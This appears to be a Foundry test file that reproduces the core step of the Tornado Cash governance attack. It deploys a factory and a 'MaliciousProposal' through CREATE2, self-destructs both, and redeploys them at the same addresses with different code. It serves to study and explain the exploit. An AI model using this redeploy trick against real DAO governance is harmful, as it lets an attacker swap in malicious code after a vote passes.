// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/TornadoCash/Factory.sol";

//twitter alert: https://twitter.com/MetaTrustAlert/status/1660116431898550273?s=20
//The PoC of the core step of redeploy of the malicious proposal in the Tornado Cash Attack
contract RedeployContractTest is Test {

    Factory factory_a;
    address proposal;
    uint number_a;

    function setUp() public {
        // create Facotry contract by the CREATE2
        factory_a = (new Factory){salt: "tornado"}();
        // create the proposal
        proposal = factory_a.createProposal();
        // original value 
        number_a = MaliciousProposal(proposal).number();
        // destroy the proposal contract
        MaliciousProposal(proposal).emergencyStop();
        // destory the factory contract
        factory_a.emergencyStop();
    }

    function test() public {
        // again, create Facotry contract with same salt by the CREATE2
        Factory factory_b = (new Factory){salt: "tornado"}();
        // The two factory addresses created with the same salt by the CREATE2 have the same addresses
        assertEq(address(factory_a), address(factory_b));
        // again, create the proposal
        address proposal_b = factory_b.createProposal2();
        // the two proposals have the same address
        assertEq(proposal, proposal_b);
        // new value
        uint number_b = MaliciousProposal(proposal).number();
        // proposals have same address but with the different numbers, which implies that the implementation of the second proposal updated
        assertFalse(number_a == number_b);
    }
}
